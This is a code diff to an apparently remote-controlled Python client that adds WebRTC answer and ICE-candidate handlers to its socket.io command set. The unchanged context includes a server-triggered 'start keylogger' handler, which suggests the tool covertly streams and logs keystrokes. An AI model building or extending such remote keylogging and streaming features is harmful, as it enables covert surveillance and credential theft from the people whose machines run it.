@@ -179,6 +179,28 @@ def register_socket_handlers():
         except Exception as e:
             log_message(f"Error stopping streaming: {e}", "error")
 
+    @sio.on('webrtc_answer')
+    def on_webrtc_answer(data):
+        try:
+            answer_sdp = data.get('answer')
+            if not answer_sdp:
+                return
+            from streaming import handle_webrtc_answer
+            handle_webrtc_answer(answer_sdp)
+        except Exception as e:
+            log_message(f"Error handling webrtc_answer: {e}", "error")
+
+    @sio.on('webrtc_ice_candidate')
+    def on_webrtc_ice_candidate(data):
+        try:
+            candidate = data.get('candidate')
+            if not candidate:
+                return
+            from streaming import add_remote_ice_candidate
+            add_remote_ice_candidate(candidate)
+        except Exception as e:
+            log_message(f"Error handling webrtc_ice_candidate: {e}", "error")
+
     @sio.event
     def on_start_keylogger(data):
         """Handle start keylogger command."""
